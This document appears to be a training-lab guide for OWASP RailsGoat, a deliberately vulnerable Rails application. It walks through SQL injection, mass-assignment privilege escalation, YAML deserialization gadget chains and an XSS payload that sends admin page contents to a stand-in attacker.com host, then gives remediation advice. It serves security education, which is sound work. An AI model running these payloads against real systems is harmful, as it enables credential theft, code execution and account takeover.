# OWASP RailsGoat: Ruby on Rails Security & OWASP Top 10

## Overview

**OWASP RailsGoat** is a deliberately vulnerable Ruby on Rails 4/5/6 web application designed to demonstrate the OWASP Top 10 security vulnerabilities specifically in Rails architectures. Created and maintained by security engineers Ken Johnson and the OWASP Foundation, RailsGoat bridges the gap between general web vulnerabilities and Rails-specific idioms, defaults, conventions, and anti-patterns.

Unlike generic challenge targets, RailsGoat is built to emulate a realistic enterprise Human Resources / Employee Portal (named _Goat Hills Financial_), containing employee directories, benefit plans, payroll documents, and administrative tools.

- **Target URL**: [http://localhost:8109](http://localhost:8109)
- **Container Name**: `cyberlab_web_railsgoat`
- **Docker Image**: `owasp/railsgoat:latest`
- **Directory**: `Classes/02_web_penetration_tester/06_owasp_top_10/railsgoat`
- **Lab Shortcut**: `./lab start railsgoat`

---

## Pre-Seeded Lab Credentials

| Role                 | Username / Email      | Password     |
| -------------------- | --------------------- | ------------ |
| **Administrator**    | `admin@railsgoat.dev` | `railsgoat!` |
| **Standard User**    | `user@railsgoat.dev`  | `railsgoat!` |
| **Alternative User** | `norm@railsgoat.dev`  | `railsgoat!` |

---

## Threat Matrix & Ruby on Rails Architecture

```
                       +------------------------------------------+
                       |          Rails Web Framework Router       |
                       +--------------------+---------------------+
                                            |
                +---------------------------+---------------------------+
                |                           |                           |
                v                           v                           v
     [ Controller Layer ]          [ Model / ORM Layer ]        [ Serialization / Data ]
     - Strong Parameters Bypass    - ActiveRecord SQLi          - Unsafe YAML.load (RCE)
     - params.permit! misuse       - String interpolation       - Marshal.load Deserialization
     - CSRF skip_before_action     - order() / pluck() flaws    - Encrypted Cookie Tampering
```

---

## Lab Execution & Quick Start

```bash
# Navigate to RailsGoat directory
cd Classes/02_web_penetration_tester/06_owasp_top_10/railsgoat

# Start the container
docker compose up -d

# Check startup logs (Rails database initialization and server boot)
docker logs -f cyberlab_web_railsgoat
```

Wait ~10 seconds for Rails and SQLite seeding to complete, then navigate to [http://localhost:8109](http://localhost:8109).

---

## Step-by-Step Vulnerability Exercises

### Exercise 1: ActiveRecord SQL Injection (A1 - Injection)

In Rails, ActiveRecord protects against SQL injection when using parameterized hashes (e.g., `User.where(email: params[:email])`). However, developers frequently introduce SQLi when using dynamic string interpolation in clauses such as `where()`, `order()`, `find_by()`, `joins()`, or `select()`.

1. Log into the application as `user@railsgoat.dev` (`railsgoat!`).
2. Navigate to **Benefits -> Paid Time Off**.
3. Observe the sorting functionality: the URL passes a `sort` or `order` parameter:
   ```http
   GET /schedule?order=date HTTP/1.1
   ```
4. In Rails source code (`schedule_controller.rb`), the query executes:
   ```ruby
   # Vulnerable pattern
   @schedules = Schedule.order("#{params[:order]} ASC")
   ```
5. Test for SQL injection using a conditional delay or boolean clause:
   ```sql
   (CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE admin=1)='a' THEN date ELSE id END)
   ```
6. Alternatively, inject statement stacking or union selects to dump sensitive tables:
   ```sql
   date, (SELECT group_concat(email || ':' || password) FROM users)
   ```

---

### Exercise 2: Strong Parameters & Mass Assignment Bypass (A5 - Broken Access Control)

Mass assignment occurs when HTTP request parameters are bound directly to Active Record models without whitelisting. Rails introduced **Strong Parameters** (`params.require(...).permit(...)`) to prevent this, but improper implementation (`permit!` or forgetting sensitive fields) allows privilege escalation.

1. Navigate to your user profile page (**My Account -> Profile**).
2. Intercept the profile update request in Burp Suite:
   ```http
   POST /users/1 HTTP/1.1
   Host: localhost:8109
   Content-Type: application/x-www-form-urlencoded

   user[first_name]=John&user[last_name]=Doe&user[email]=user@railsgoat.dev
   ```
3. Inspect the underlying Rails controller (`users_controller.rb`):
   ```ruby
   def user_params
     # Vulnerable: either permits all parameters or allows admin flag
     params.require(:user).permit!
   end
   ```
4. Inject administrative attributes into the payload:
   ```http
   user[first_name]=John&user[last_name]=Doe&user[admin]=true&user[role_id]=1
   ```
5. Send the request. Refresh your browser session; observe the new **Admin Portal** tab in the navigation bar, confirming full administrative privilege escalation.

---

### Exercise 3: Insecure YAML & Marshal Deserialization (A8 - Insecure Deserialization)

Ruby developers often use YAML or Marshal to store session tokens, user preferences, or structured data.

1. **Unsafe YAML.load**:
   Prior to Ruby 3.1 / Psych 4, `YAML.load(input)` executes code during deserialization if an object with a custom gadget is passed.
   ```ruby
   # Vulnerable code
   data = YAML.load(params[:user_file])
   ```
2. **Crafting YAML RCE Payload**:
   A classic Rails YAML deserialization gadget uses `ActionDispatch::Routing::RouteSet::NamedRouteCollection`:
   ```yaml
   ---
   !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
   "foo": !ruby/object:OpenStruct
     table:
       :defaults: {}
   ```
   Or Universal Ruby Deserialization Gadgets (via `Gem::Requirement` and `Gem::DependencyList`):
   ```yaml
   ---
   !ruby/object:Gem::Requirement
   requirements: !ruby/object:Gem::DependencyList
     specs:
       - !ruby/object:Gem::Source::SpecificFile
         spec: !ruby/object:Gem::Package::TarReader
           io: !ruby/object:Net::BufferedIO
             io: !ruby/object:Gem::Package::DigestIO
               digester: !ruby/object:Gem::Security::Policy
                 permissions:
                   - !ruby/object:Gem::Security::Policy
                     opt: id
   ```
3. Submit the YAML payload to the document/profile import endpoint to verify code execution.

---

### Exercise 4: ERB Template Injection & XSS (A7 - Cross-Site Scripting)

Rails ERB templates automatically HTML-escape variables rendered with `<%= ... %>`. However, vulnerabilities occur when developers deliberately bypass escaping:

1. **Anti-Patterns in Rails Views**:
   ```erb
   <!-- Vulnerable uses of raw, html_safe, and sanitize -->
   <%= raw @user.bio %>
   <%= @user.bio.html_safe %>
   ```
2. Navigate to **Work Performance -> Reviews** or **Messages**.
3. Submit an XSS payload containing an SVG or event listener:
   ```html
   <img
     src="x"
     onerror="fetch('/admin/users').then(r=>r.text()).then(d=>new Image().src='http://attacker.com/?stolen='+encodeURIComponent(d))"
   />
   ```
4. Verify execution when viewing the comment or profile page.

---

## Defensive Engineering & Remediation

1. **Safe SQL Querying in ActiveRecord**:
   Never interpolate untrusted parameters directly into raw SQL strings:
   ```ruby
   # SAFE: Hash-based conditions
   User.where(email: params[:email], active: true)

   # SAFE: Array/positional parameter binding
   Schedule.where("status = ? AND created_at > ?", params[:status], 1.week.ago)

   # SAFE: Strict whitelist for ORDER BY clauses
   valid_sorts = { "date" => "created_at", "name" => "employee_name" }
   sort_column = valid_sorts.fetch(params[:sort], "created_at")
   Schedule.order(sort_column => :asc)
   ```
2. **Strict Strong Parameters**:
   Never use `params.permit!`. Explicitly enumerate allowed user-modifiable attributes:
   ```ruby
   def user_params
     params.require(:user).permit(:first_name, :last_name, :email)
     # Exclude :admin, :role_id, :password_digest, :account_id
   end
   ```
3. **Safe Deserialization**:
   Always use `YAML.safe_load(yaml_string, permitted_classes: [...])` or migrate to `JSON.parse` for external user inputs.
4. **Automated Rails Static Analysis (Brakeman)**:
   Add `brakeman` to your CI/CD pipeline to catch ActiveRecord SQLi, mass assignment, and unescaped views before code is deployed:
   ```bash
   gem install brakeman && brakeman -q -z
   ```

---

## Verified YouTube Walkthroughs & Solving Guides

All videos verified active via YouTube oEmbed API (`HTTP 200 OK`):

- [OWASP Foundation - OWASP Global Webinar - Ken Johnson - RailsGoat](https://www.youtube.com/watch?v=NPwnzH-5udI) — Official OWASP webinar presentation by RailsGoat creator Ken Johnson walking through the architecture and vulnerability demonstrations.
- [Connor Mendenhall - Railsgoat - SQL Injection](https://www.youtube.com/watch?v=I5XAN_pkfIY) — Hands-on walkthrough demonstrating ActiveRecord SQL injection exploitation in RailsGoat.
- [Noah Clark - Rails SQL injection with Active Record](https://www.youtube.com/watch?v=jcouSB4Q2wo) — Technical breakdown of how ActiveRecord queries become vulnerable to SQL injection.
- [Web Development Tutorials - Ruby on Rails - Web development basic Series: Strong Parameters and Mass Assignment Protection](https://www.youtube.com/watch?v=jC_aZB__dSE) — Clear explanation of mass assignment, Strong Parameters, and privilege escalation vulnerabilities in Rails.

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Start RailsGoat
./lab start railsgoat

# Check status
./lab status

# Open interactive bash inside RailsGoat
./lab shell railsgoat

# Stop RailsGoat
./lab stop railsgoat
```
